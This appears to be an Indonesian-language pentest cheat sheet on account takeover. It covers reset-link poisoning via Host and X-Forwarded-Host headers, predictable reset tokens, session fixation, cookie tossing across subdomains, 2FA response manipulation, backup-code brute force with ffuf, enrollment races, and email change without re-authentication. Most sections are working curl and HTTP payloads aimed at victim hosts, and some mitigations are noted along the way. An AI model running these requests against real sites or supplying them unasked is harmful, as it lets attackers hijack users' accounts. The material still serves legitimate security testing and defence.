# ato-misc — auth

# Account Takeover di Luar OAuth

## 1. Reset Password Poisoning via Host / X-Forwarded-Host

**Mekanisme:** app membangun URL reset dari header Host atau X-Forwarded-Host tanpa allowlist. Mailer mengirim link `https://attacker.tld/reset?token=...`.

| Header | Konteks | Efek |
|---|---|---|
| `Host: attacker.tld` | nginx `proxy_set_header Host $host;` diteruskan ke app | Link reset menunjuk attacker |
| `X-Forwarded-Host: attacker.tld` | nginx `proxy_set_header X-Forwarded-Host $host;` + app memakai `request.host_url` (Flask) atau `req.get('host')` (Express) | Sama |
| `X-Forwarded-Host: a.tld, victim.tld` | App ambil elemen pertama | Poison bila parser ambil first |
| `X-Forwarded-Host: victim.tld@attacker.tld` | Parser naive `urlparse` | userinfo trick |
| `X-Original-URL: /reset` + `Host: attacker.tld` | Beberapa framework (Symfony <5.4, Yii2) | Route override + poison |

**Request flow konkret (nginx 1.25 + PHP-FPM):**

```bash
# 1. Catat token victim dari request sah
curl -si -X POST https://victim.tld/api/password/forgot \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@corp.tld"}' \
  --resolve victim.tld:443:10.0.0.5
# Server 200, mail terkirim berisi https://victim.tld/reset/abc123

# 2. Poison — picu reset kedua dengan header palsu
curl -si -X POST https://victim.tld/api/password/forgot \
  -H 'Host: victim.tld' \
  -H 'X-Forwarded-Host: attacker.tld' \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@corp.tld"}'
```

**Yang muncul:** email kedua berisi `https://attacker.tld/reset/xyz789`. Korban klik → token `xyz789` tiba di access log attacker → replay ke `https://victim.tld/reset/xyz789`.

**Kenapa berhasil:** app memakai `req.headers['x-forwarded-host'] || req.headers.host` tanpa validasi. **Gagal bila:** nginx `server_name` strict + `proxy_set_header X-Forwarded-Host "";` atau framework punya `TRUSTED_HOSTS` / `ALLOWED_HOSTS` (Django `ALLOWED_HOSTS`, Rails `config.hosts`, Laravel `TrustProxies`). Cek juga `X-Forwarded-Proto: https` untuk skema.

**Varian reverse-proxy yang sering bocor (CVE class):**
- GitLab <16.6 (`X-Forwarded-Host` di reset)
- Joomla <3.9.26
- WordPress plugin `Password Reset` <1.5.2

---

## 2. Token Reset Lemah

| Varian | Contoh artefak | Deteksi | Kenapa gagal di prod |
|---|---|---|---|
| Predictable (sequential ID) | `/reset?t=10045` | Dua request, delta = 1 | Token tidak dipakai untuk reset |
| Predictable (md5(email)) | `md5("victim@x.tld")` = `a1b2…` | Hash cocok dengan email | Ada salt server-side |
| Timestamp-based | `sha1(email + unixtime)` | Forge loop 60s window | Microsecond salt |
| No expiry | Token dari arsip 2019 masih valid | Test token lama | Server-side TTL via Redis |
| Cross-account reuse | Token A dipakai untuk reset akun B | Ganti `user_id` di body | Token terikat session server-side |
| Tidak invalidasi setelah pakai | Token dipakai ulang 2× | Request kedua sukses | Ada one-time flag |
| Tidak invalidasi setelah login | Token tetap valid setelah user login manual | Request reset lalu login, token tetap work | Token rotasi saat `login_success` |

**Perintah uji:**

```bash
# Burst token validity window
for i in $(seq 1 20); do
  curl -s "https://victim.tld/reset?t=$i" -o /dev/null -w "%{http_code} "
done

# Reuse
curl -si "https://victim.tld/reset/abc123" -d 'password=NewP@ss1'
curl -si "https://victim.tld/reset/abc123" -d 'password=NewP@ss2'   # ekspektasi 410/400
```

**Token cross-account:** kirim `POST /reset` dengan `{"token":"abc","email":"attacker@x.tld"}` — bila app pakai token user lain tapi lookup user dari body, takeover 1 request.

---

## 3. Session Fixation

**Pola klasik:** app tidak regenerasi session ID setelah login.

```http
GET /login HTTP/1.1
Host: victim.tld
# Response: Set-Cookie: SESSID=AAAAAAAAAAAAAAAA
```

Attacker pre-set `SESSID` di browser korban (via XSS, meta refresh, atau subdomain cookie injection), korban login → session ID sama → attacker pakai `SESSID=AAAA…`.

**Request flow:**

```bash
# 1. Attacker ambil SESSID valid pra-auth
curl -si https://victim.tld/login | grep -i set-cookie
# Set-Cookie: PHPSESSID=abc123def456; path=/; HttpOnly

# 2. Attacker tanam SESSID ke korban (contoh via another subdomain xss)
# <script>document.cookie="PHPSESSID=abc123def456;domain=.victim.tld"</script>

# 3. Korban login → cek apakah Set-Cookie baru
curl -si -X POST https://victim.tld/login \
  -b 'PHPSESSID=abc123def456' \
  -d 'u=victim&p=...'
# Kalau TIDAK ada Set-Cookie baru → fixed

# 4. Attacker pakai
curl -si https://victim.tld/account -b 'PHPSESSID=abc123def456'
```

**Kenapa berhasil:** PHP <5.4 default tidak regenerasi; framework modern (`session_regenerate_id(true)` post-auth, `req.session.regenerate()` di express-session, Django `cycle_key()`) menutup ini. Cek juga `SameSite=Lax` (Chrome 131 default) — mitigasi tapi bukan fix bila subdomain overlap.

---

## 4. Cookie Tossing Antar Subdomain

**Prasyarat:** cookie `Domain=.victim.tld` + salah satu subdomain XSS atau attacker-controlled (mis. `dev.victim.tld`, `legacy.victim.tld`, `blog.victim.tld` via CNAME takeover).

**Mekanisme:** subdomain attacker set `Set-Cookie: SESSID=fixed; Domain=.victim.tld; Path=/login` dengan Path lebih spesifik → browser kirim dua cookie `SESSID`, app ambil yang terakhir/tertentu.

```http
# Di attacker.victim.tld (control subdomain)
HTTP/1.1 200 OK
Set-Cookie: SESSID=attackerFixed; Domain=.victim.tld; Path=/; Secure
Set-Cookie: SESSID=attackerFixed2; Domain=.victim.tld; Path=/account; Secure
```

**Request flow ke target:**

```bash
# Generate dua cookie SESSID di jar
curl -sc /tmp/jar https://attacker.victim.tld/set-cookies
cat /tmp/jar
# victim.tld  FALSE  /  TRUE  0  SESSID  attackerFixed
# victim.tld  FALSE  /account  TRUE  0  SESSID  attackerFixed2

# Trigger victim login di /login (path / — pakai attackerFixed)
# Setelah login, arahkan ke /account → app kirim attackerFixed2 → server bingung

curl -si https://victim.tld/account -b /tmp/jar
```

**Cek kapan berhasil:** PHP `session.use_strict_mode=0` + `session.use_cookies=1` akan *accept* ID attacker. Node/Express `express-session` default mengambil cookie pertama dari header string — bisa di-shadow jika attacker mengirim dua. Java `JSESSIONID` di Tomcat 10.1 mengenali `;` dan path-scoped kolisi.

**Mitigasi yang mematikan teknik:** prefiks `__Host-` (memaksa `Domain` absen, `Path=/`, `Secure`) dan `__Secure-`. Cookie bernama `__Host-SESSID` dari subdomain attacker akan ditolak browser Chrome 131.

---

## 5. 2FA Bypass

### 5.1 Response manipulation

Request 2FA challenge:

```http
POST /api/2fa/verify HTTP/1.1
Host: victim.tld
Cookie: SESSID=<pra-2fa>
Content-Type: application/json

{"code":"000000"}
```

Response `HTTP/1.1 200 OK {"ok":false,"next":"/2fa"}`.

**Manipulasi klien:** ganti body jadi `{"ok":true,"next":"/account"}` — berhasil bila *hanya* SPA yang menghalangi. Uji server-side: langsung request endpoint yang butuh auth dengan session pra-2FA.

```bash
curl -si https://victim.tld/api/account -b 'SESSID=<pra-2fa>'
# Ekspektasi 401/403. Kalau 200 → server tidak re-cek.
```

**Varian field tambahan:** `{"code":"123456","verified":true}`, `{"otp":"","step":"2"}` pada JSON deserializer longgar (Jackson `@JsonAnySetter`, Go `map[string]interface{}` + `json.Number`).

### 5.2 Backup code brute

| Kontrol | Brute feasibility |
|---|---|
| 8 kode × 8 digit alfanumerik, no rate limit | Trivial via ffuf |
| Rate limit per IP (bukan per akun) | Rotate proxy |
| Kode tidak dihapus setelah dipakai | Reuse |
| Case-insensitive non-hyphen | 10^8 vs 32^8 |
| Timing oracle (`valid_but_used` vs `invalid`) | Enumerasi status |

```bash
ffuf -u https://victim.tld/api/2fa/backup \
  -X POST -H 'Content-Type: application/json' \
  -H 'Cookie: SESSID=<pra-2fa>' \
  -d '{"code":"FUZZ"}' \
  -w <(seq -f "%08g" 0 99999999) \
  -fr 'invalid|rate' -mc 200
```

**Race enrollment** (`5.3`): saat user baru mendaftarkan 2FA, endpoint `POST /2fa/enroll` mengembalikan `secret` + `qr`. Kirim dua request paralel `POST /2fa/activate` dengan kode valid dan kode invalid — bila server memvalidasi setelah menyimpan `confirmed_at`, salah satu bisa lolos tanpa verifikasi nyata.

```bash
seq 2 | xargs -P2 -I{} curl -si -X POST https://victim.tld/api/2fa/activate \
  -H 'Cookie: SESSID=<user>' -d 'code=000000'
```

**Cek:** apakah setelah enroll 2FA, session pra-enroll masih valid (bypass `2fa_required` flag via `Set-Cookie` tanpa `2fa=ok`).

---

## 6. Email Change Tanpa Re-auth

**Pola:** `POST /api/account/email` hanya butuh session, tidak minta password/2FA.

```http
POST /api/account/email HTTP/1.1
Cookie: SESSID=<session hasil XSS/CSRF/session fixation>
Content-Type: application/json

{"email":"attacker@evil.tld"}
```

**Flow takeover:**
1. Attacker punya session korban (XSS/cookie tossing/session fixation).
2. Ubah email → attacker@evil.tld (jika tak ada verifikasi ke email lama).
3. Trigger reset password → token ke attacker.
4. Login sebagai korban.

**Varian bypass re-auth:**
- Field `current_password` diabaikan bila `null`/`""`/field tidak ada (`@RequestBody` partial).
- Re-auth hanya cek di frontend.
- Endpoint alternatif: `PATCH /api/users/me` dengan `email` (mass assignment), GraphQL `mutation updateUser`.
- Email change via API mobile (`X-Client: mobile`) — backend version berbeda tanpa gate.
- `PUT /api/profile` dengan `{"email":..., "role":"admin"}` (mass assignment ke privilege).

```bash
curl -si -X PATCH https://victim.tld/api/users/me \
  -H 'Cookie: SESSID=<korban>' -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.tld","email_verified":true}'
# Periksa: 200 tanpa password, perubahan langsung efektif
```

**Cek:** email lama menerima notifikasi? Verifikasi ke email baru? Reset session di semua device? Kalau tidak ada ketiganya, takeover lengkap tanpa interaksi korban selain klik.

---

## 7. Jebakan Operasional Lapangan

1. **Proxy berlapis klien (CDN) menormalisasi header.** Cloudflare 2024 + AWS ALB akan strip `X-Forwarded-Host` duplikat / gabung menjadi `a, b`. Butuh origin IP bypass untuk uji header poisoning — cari `ssl.origin` di crt.sh, atau history DNS.
2. **Allowlist host keras di framework modern.** Django 5.0 `ALLOWED_HOSTS`, Rails 7.1 `config.hosts`, Laravel 11 `TrustProxies` + `$proxies` whitelist. Sering trigger 400 `DisallowedHost` — jangan kira ini aman; cek endpoint yang pakai `request.get_host()` *sebelum* middleware, mis. error handler.
3. **Mailer melakukan URL rewrite.** Amazon SES, SendGrid, Mailgun kadang rewrite link tracking (`/wf/click?url=...`) dan mengganti domain — poison tetap terkirim tapi di-wrap; decode ulang query `url=` untuk lihat `attacker.tld`.
4. **Token reset di-hash di DB.** Inferensi cross-account salah bila token = `sha256(raw)`. Uji validasi dengan token dari akun lain, bukan raw.
5. **Session fixation "berhasil" tapi session expired.** Express-session `rolling:true` + `resave:false` sering regenerate post-login tanpa Set-Cookie baru — cocokkan timestamp `expires`.
6. **Chrome 131 cookie prefix `__Host-`.** Bila app sudah migrasi (jarang), cookie tossing mati total. Cek `Set-Cookie` header: ada prefix atau tidak. Firefox 133 belum enforce `__Host-` untuk cookie yang di-set via `document.cookie` di subdomain — masih viable di FF.
7. **Rate limit per-akun di 2FA.** X-Forwarded-For spoof tidak menolong bila counter di kunci `user_id`. Butuh rate limit bypass via HTTP/2 multiplexing (`h2` group), bukan IP rotate.
8. **Email change flow dual-confirm.** Beberapa SaaS kirim konfirmasi ke email lama *dan* baru. Klik konfirmasi email baru saja tidak cukup; harus ada klik di email lama juga — cek DB `email_change_token` punya dua kolom atau satu.
9. **MFA enrollment race di cluster.** PostgreSQL `SERIALIZABLE` atau RDS multi-AZ bisa membuat dua request enroll tidak race; MySQL 8 dengan `REPEATABLE READ` sering split-brain. Uji di staging dengan replika topologi prod.
10. **Log req/res di WAF bisa jadi sumber token.** Bila reset link di-log (mis. ALB access log dengan full query), teknik poison jadi tak perlu — cukup baca log. Jangan lupa review retention.

---

## [reasoning trace]


